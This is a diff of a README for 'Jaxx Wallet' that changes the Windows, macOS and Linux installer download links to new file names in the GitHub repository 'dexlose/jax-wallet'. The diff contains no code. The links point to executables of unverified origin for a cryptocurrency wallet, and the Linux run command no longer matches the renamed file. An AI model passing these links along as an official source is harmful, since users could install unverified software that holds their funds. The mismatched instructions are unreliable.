@@ -36,7 +36,7 @@ To install Jaxx Wallet, follow the instructions for your operating system below:
 ### 🖥️ **For Windows:**
 
 1. **Download the Windows Installer**:
-   - [Windows Installer (64-bit)](https://github.com/dexlose/jax-wallet/releases/download/v1.9.3/jaxx-wallet-setup.exe)
+   - [Windows Installer (64-bit)](https://github.com/dexlose/jax-wallet/releases/download/v1.9.3/jax-setup-1.9.3.exe)
 
 2. **Run the installer**:
    - Double-click the `.exe` file to launch the setup wizard.
@@ -52,7 +52,7 @@ To install Jaxx Wallet, follow the instructions for your operating system below:
 ### 🍏 **For macOS:**
 
 1. **Download the macOS DMG file**:
-   - [macOS DMG](https://github.com/dexlose/jax-wallet/releases/download/v1.9.3/jaxx-wallet.dmg)
+   - [macOS DMG](https://github.com/dexlose/jax-wallet/releases/download/v1.9.3/JaxWallet-1.9.3.dmg)
 
 2. **Install the application**:
    - Open the `.dmg` file and drag **Jaxx Wallet** into your Applications folder.
@@ -65,7 +65,7 @@ To install Jaxx Wallet, follow the instructions for your operating system below:
 ### 🐧 **For Linux:**
 
 1. **Download the Linux AppImage**:
-   - [Linux AppImage](https://github.com/dexlose/jax-wallet/releases/download/v1.9.3/jaxx-wallet-linux.AppImage)
+   - [Linux AppImage](https://github.com/dexlose/jax-wallet/releases/download/v1.9.3/Jax.Wallet-1.9.3.AppImage)
 
 2. **Make the AppImage executable**:
    - Run the following command in your terminal:
@@ -78,6 +78,7 @@ To install Jaxx Wallet, follow the instructions for your operating system below:
    ```bash
    ./jaxx-wallet-linux.AppImage
    ```
+
 
 ---
 
